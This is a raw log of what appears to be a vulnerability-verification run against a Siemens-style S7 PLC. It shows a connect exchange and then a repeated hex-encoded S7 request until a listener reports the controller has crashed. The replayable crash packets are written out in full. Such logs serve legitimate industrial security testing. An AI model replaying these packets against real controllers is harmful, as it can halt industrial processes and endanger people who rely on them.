[2021-12-19 19:59:17,366] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 19:59:17,517] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000010000080000f000000a000a00f0
[2021-12-19 19:59:17,517] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f080320300000100000800000000f0000003000300f0
[2021-12-19 19:59:17,518] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 19:59:17,518] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 95
[2021-12-19 19:59:17,520] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000200000800080001120411440100ff090004001c0000
[2021-12-19 19:59:17,732] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000300000800080001120411440100ff090004001c0000
[2021-12-19 19:59:17,939] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000400000800080001120411440100ff090004001c0000
[2021-12-19 19:59:18,145] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000500000800080001120411440100ff090004001c0000
[2021-12-19 19:59:18,351] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000600000800080001120411440100ff090004001c0000
[2021-12-19 19:59:18,568] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000700000800080001120411440100ff090004001c0000
[2021-12-19 19:59:18,775] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000800000800080001120411440100ff090004001c0000
[2021-12-19 19:59:18,981] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000900000800080001120411440100ff090004001c0000
[2021-12-19 19:59:19,187] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000a00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:19,390] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000b00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:19,597] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000c00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:19,803] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000d00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:20,007] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000e00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:20,210] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000f00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:20,415] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001000000800080001120411440100ff090004001c0000
[2021-12-19 19:59:20,621] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001100000800080001120411440100ff090004001c0000
[2021-12-19 19:59:20,824] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001200000800080001120411440100ff090004001c0000
[2021-12-19 19:59:21,032] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001300000800080001120411440100ff090004001c0000
[2021-12-19 19:59:21,237] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001400000800080001120411440100ff090004001c0000
[2021-12-19 19:59:21,442] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001500000800080001120411440100ff090004001c0000
[2021-12-19 19:59:21,647] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001600000800080001120411440100ff090004001c0000
[2021-12-19 19:59:21,851] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001700000800080001120411440100ff090004001c0000
[2021-12-19 19:59:22,057] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001800000800080001120411440100ff090004001c0000
[2021-12-19 19:59:22,263] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001900000800080001120411440100ff090004001c0000
[2021-12-19 19:59:22,466] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001a00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:22,672] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001b00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:22,877] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001c00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:23,080] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001d00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:23,288] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001e00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:23,493] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700001f00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:23,700] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002000000800080001120411440100ff090004001c0000
[2021-12-19 19:59:23,905] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002100000800080001120411440100ff090004001c0000
[2021-12-19 19:59:24,110] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002200000800080001120411440100ff090004001c0000
[2021-12-19 19:59:24,314] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002300000800080001120411440100ff090004001c0000
[2021-12-19 19:59:24,521] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002400000800080001120411440100ff090004001c0000
[2021-12-19 19:59:24,738] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002500000800080001120411440100ff090004001c0000
[2021-12-19 19:59:24,953] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002600000800080001120411440100ff090004001c0000
[2021-12-19 19:59:25,159] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002700000800080001120411440100ff090004001c0000
[2021-12-19 19:59:25,364] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002800000800080001120411440100ff090004001c0000
[2021-12-19 19:59:25,572] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002900000800080001120411440100ff090004001c0000
[2021-12-19 19:59:25,775] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002a00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:25,983] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002b00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:26,189] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002c00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:26,394] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002d00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:26,596] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002e00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:26,803] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700002f00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:27,006] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003000000800080001120411440100ff090004001c0000
[2021-12-19 19:59:27,209] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003100000800080001120411440100ff090004001c0000
[2021-12-19 19:59:27,416] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003200000800080001120411440100ff090004001c0000
[2021-12-19 19:59:27,620] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003300000800080001120411440100ff090004001c0000
[2021-12-19 19:59:27,828] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003400000800080001120411440100ff090004001c0000
[2021-12-19 19:59:28,035] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003500000800080001120411440100ff090004001c0000
[2021-12-19 19:59:28,240] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003600000800080001120411440100ff090004001c0000
[2021-12-19 19:59:28,456] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003700000800080001120411440100ff090004001c0000
[2021-12-19 19:59:28,661] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003800000800080001120411440100ff090004001c0000
[2021-12-19 19:59:28,866] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003900000800080001120411440100ff090004001c0000
[2021-12-19 19:59:29,073] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003a00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:29,278] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003b00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:29,483] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003c00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:29,689] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003d00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:29,894] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003e00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:30,102] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700003f00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:30,308] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004000000800080001120411440100ff090004001c0000
[2021-12-19 19:59:30,515] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004100000800080001120411440100ff090004001c0000
[2021-12-19 19:59:30,717] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004200000800080001120411440100ff090004001c0000
[2021-12-19 19:59:30,925] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004300000800080001120411440100ff090004001c0000
[2021-12-19 19:59:31,131] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004400000800080001120411440100ff090004001c0000
[2021-12-19 19:59:31,336] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004500000800080001120411440100ff090004001c0000
[2021-12-19 19:59:31,544] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004600000800080001120411440100ff090004001c0000
[2021-12-19 19:59:31,745] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004700000800080001120411440100ff090004001c0000
[2021-12-19 19:59:31,953] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004800000800080001120411440100ff090004001c0000
[2021-12-19 19:59:32,160] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004900000800080001120411440100ff090004001c0000
[2021-12-19 19:59:32,363] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004a00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:32,570] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004b00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:32,776] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004c00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:32,981] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004d00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:33,189] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700004e00000800080001120411440100ff090004001c0000
[2021-12-19 19:59:33,220] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 19:59:33,390] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
